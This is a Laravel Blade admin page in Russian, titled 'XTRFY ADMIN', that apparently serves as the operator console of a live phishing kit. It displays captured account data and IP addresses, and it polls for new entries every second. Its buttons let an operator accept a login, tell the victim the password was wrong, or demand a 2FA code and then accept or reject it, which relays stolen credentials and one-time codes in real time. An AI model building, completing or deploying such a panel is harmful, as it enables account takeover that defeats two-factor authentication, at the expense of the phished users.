<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="assets/images/favicon.svg" type="image/x-icon" />
    <title>Логи | XTRFY ADMIN</title>

    <!-- ========== All CSS files linkup ========= -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
    <link rel="stylesheet" href="assets/css/lineicons.css" />
    <link rel="stylesheet" href="assets/css/materialdesignicons.min.css" />
    <link rel="stylesheet" href="assets/css/fullcalendar.css" />
    <link rel="stylesheet" href="assets/css/main.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</head>
<body>
<!-- ======== Preloader =========== -->

<!-- ======== Preloader =========== -->

<!-- ======== main-wrapper start =========== -->
<main class="main-wrapper">


    <!-- ========== table components start ========== -->
    <section class="table-components">
        <div class="container-fluid">
            <!-- ========== title-wrapper start ========== -->
            <div class="title-wrapper pt-30">
                <div class="row align-items-center">
                    <div class="col-md-6">
                        <div class="title">
                            <h2>Действия</h2>
                        </div>
                    </div>

                </div>
                <!-- end row -->
            </div>
            <!-- ========== title-wrapper end ========== -->

            <!-- ========== tables-wrapper start ========== -->
            <div class="tables-wrapper">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="card-style mb-30">
                            <h6 class="mb-10">Данные</h6>
                            <p class="text-sm mb-20">
                                Здесь ты можешь принять/отклонить авторизацию или отправить на 2FA
                            </p>
                            <div class="table-wrapper table-responsive">
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th class="lead-info">
                                            <h6>Данные от аккаунта</h6>
                                        </th>
                                        <th class="lead-email">
                                            <h6>Этап</h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>Дата </h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>IP </h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>Тип действия </h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6># </h6>
                                        </th>

                                    </tr>
                                    <!-- end table row-->
                                    </thead>
                                    <tbody id="actions_active">
                                    @foreach($actions_active as $action_active)
                                        <tr>
                                            <td class="min-width">
                                                <div class="lead">
                                                    <div class="lead-image">

                                                    </div>
                                                    <div class="lead-text">
                                                        <p>{{$action_active['data']}}</p>
                                                    </div>
                                                </div>
                                            </td>
                                            <td class="min-width">
                                                <p><p>{{$action_active['status']}}</p></p>
                                            </td>
                                            <td class="min-width">
                                                <p><p>{{$action_active['ip']}}</p></p>
                                            </td>

                                            <td class="min-width">
                                                <p><p>{{$action_active['updated_at']}}</p></p>
                                            </td>
                                            <td class="min-width">
                                                <p><p>{{$action_active['type_action']}}</p></p>
                                            </td>

                                            <td>
                                                <div class="action d-flex max-w-200 flex-column gap-2">
                                                    <button onclick="confirm('order_id')" class="p-1 w-100 main-btn primary-btn btn-hover">
                                                        Подтвердить вход
                                                    </button>
                                                    <button onclick="cancel('order_id')" class="p-1 w-100 main-btn danger-btn btn-hover">
                                                        Отклонить вход
                                                    </button>
                                                    <button onclick="sendCode('order_id')" class="p-1 w-100 main-btn secondary-btn btn-hover">
                                                        Запросить код
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                    @endforeach


                                    </tbody>
                                </table>
                                <!-- end table -->
                            </div>
                        </div>
                        <!-- end card -->
                    </div>
                    <!-- end col -->
                </div>
                <!-- end row -->

            </div>
            <div class="tables-wrapper">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="card-style mb-30">
                            <h6 class="mb-10">Аккаунты с завершенными этапами</h6>
                            <p class="text-sm mb-20">
                                Здесь ты можешь увидеть аккаунты которые завершили вход
                            </p>
                            <div class="table-wrapper table-responsive">
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th class="lead-info">
                                            <h6>Данные от аккаунта</h6>
                                        </th>
                                        <th class="lead-email">
                                            <h6>Этап</h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>Дата </h6>
                                        </th>


                                    </tr>
                                    <!-- end table row-->
                                    </thead>
                                    <tbody id="actions_finished">
                                    @foreach($actions_finished as $action_finished)
                                        <tr>
                                            <td class="min-width">
                                                <div class="lead">
                                                    <div class="lead-image">

                                                    </div>
                                                    <div class="lead-text">
                                                        <p>{{$action_finished['data']}}</p>
                                                    </div>
                                                </div>
                                            </td>
                                            <td class="min-width">
                                                <p>{{$action_finished['status']}}</p>
                                            </td>
                                            <td class="min-width">
                                                <p>{{$action_finished['created_at']}}</p>
                                            </td>


                                        </tr>
                                    @endforeach


                                    </tbody>
                                </table>
                                <!-- end table -->
                            </div>
                        </div>
                        <!-- end card -->
                    </div>
                    <!-- end col -->
                </div>
                <!-- end row -->

            </div>
        </div>
        <!-- end container -->
    </section>
    <!-- ========== table components end ========== -->

    <script>
        function sendCode(id){
            $.ajax({
                url: '/admin/action/change/status/',
                type: 'GET',
                data: {
                    id: id,
                    status: 'code'
                },
                success: function (data) {
                    ajaxQueryUpdateTables()
                }
            })
        }

        function confirmAuth(id){
            $.ajax({
                url: '/admin/action/change/status/',
                type: 'GET',
                data: {
                    id: id,
                    status: 'finished_auth'
                },
                success: function (data) {
                    console.log(data)
                    ajaxQueryUpdateTables()
                }
            })
        }
        function cancelAuth(id){
            $.ajax({
                url: '/admin/action/change/status/',
                type: 'GET',
                data: {
                    id: id,
                    status: 'wrongPassword'
                },
                success: function (data) {

                    ajaxQueryUpdateTables()
                }
            })
        }
        function confirmCode(id){
            $.ajax({
                url: '/admin/action/change/status/',
                type: 'GET',
                data: {
                    id: id,
                    status: 'finished_code'
                },
                success: function (data) {
                    console.log(data)
                    ajaxQueryUpdateTables()
                }
            })
        }
        function cancelCode(id){
            $.ajax({
                url: '/admin/action/change/status/',
                type: 'GET',
                data: {
                    id: id,
                    status: 'wrongCode'
                },
                success: function (data) {
                    console.log(data)
                    ajaxQueryUpdateTables()
                }
            })
        }
        function updateTables(data) {
            try {
                // Парсинг данных
                const actionsActive = data.actions_active;
                const actionsFinished = data.actions_finished;



                // Обновление таблицы actions_active
                const actions_finished = document.getElementById('actions_finished'); // Замените 'activeTableBody' на реальный ID вашей таблицы

                if (!actions_finished) {
                    throw new Error("Не удалось найти элемент с ID 'activeTableBody'");
                }
                actions_finished.innerHTML = ""
                actionsFinished.forEach(actionActive => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                <td class="min-width">
                    <div class="lead">
                        <div class="lead-image"></div>
                        <div class="lead-text"><p>${actionActive.data}</p></div>
                    </div>
                </td>
                <td class="min-width"><p>${actionActive.status}</p></td>
                <td class="min-width"><p>${actionActive.created_at}</p></td>
            `;
                    actions_finished.appendChild(row);
                });

                // Обновление таблицы actions_finished
                const actions_active = document.getElementById('actions_active'); // Замените 'finishedTableBody' на реальный ID вашей таблицы
                if (!actions_active) {
                    throw new Error("Не удалось найти элемент с ID 'finishedTableBody'");
                }
                actions_active.innerHTML = ""

                actionsActive.forEach(actionFinished => {
                    const row = document.createElement('tr');
                    var buttons = "";
                    if(actionFinished.type_action === "code"){
                         buttons = `
                        <button onclick="confirmCode(${actionFinished.id})" class="p-1 w-100 main-btn primary-btn btn-hover">Подтвердить вход</button>
                        <button onclick="cancelCode(${actionFinished.id})" class="p-1 w-100 main-btn danger-btn btn-hover">Отклонить вход</button>
                        `;
                    }
                    else{
                         buttons = `
                        <button onclick="confirmAuth(${actionFinished.id})" class="p-1 w-100 main-btn primary-btn btn-hover">Подтвердить вход</button>
                        <button onclick="cancelAuth(${actionFinished.id})" class="p-1 w-100 main-btn danger-btn btn-hover">Отклонить вход</button>
                        <button onclick="sendCode(${actionFinished.id})" class="p-1 w-100 main-btn secondary-btn btn-hover">Запросить код</button>
                        `
                    }
                    row.innerHTML = `
                <td class="min-width">
                    <div class="lead">
                        <div class="lead-image"></div>
                        <div class="lead-text"><p>${actionFinished.data}</p></div>
                    </div>
                </td>
                <td class="min-width"><p>${actionFinished.status}</p></td>
                <td class="min-width"><p>${actionFinished.updated_at}</p></td>
                <td class="min-width"><p>${actionFinished.ip}</p></td>
                <td class="min-width"><p>${actionFinished.type_action}</p></td>
                <td>
                    <div class="action d-flex max-w-200 flex-column gap-2">
                    ${buttons}
                    </div>
                </td>
            `;
                    actions_active.appendChild(row);
                });
            } catch (error) {
                console.error("Произошла ошибка при обновлении таблицы:", error.message);
            }
        }
        function ajaxQueryUpdateTables(){
            $.ajax({
                url: '/admin/actions',
                type: 'GET',
                success: function (data) {
                    console.log(data)
                    data = JSON.parse(data);
                    updateTables(data);
                }
            })
        }
        setInterval(ajaxQueryUpdateTables, 1000);
        ajaxQueryUpdateTables()

    </script>
</main>
<!-- ======== main-wrapper end =========== -->

<!-- ========= All Javascript files linkup ======== -->
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/Chart.min.js"></script>
<script src="assets/js/dynamic-pie-chart.js"></script>
<script src="assets/js/moment.min.js"></script>
<script src="assets/js/fullcalendar.js"></script>
<script src="assets/js/jvectormap.min.js"></script>
<script src="assets/js/world-merc.js"></script>
<script src="assets/js/polyfill.js"></script>
<script src="assets/js/main.js"></script>
</body>
</html>
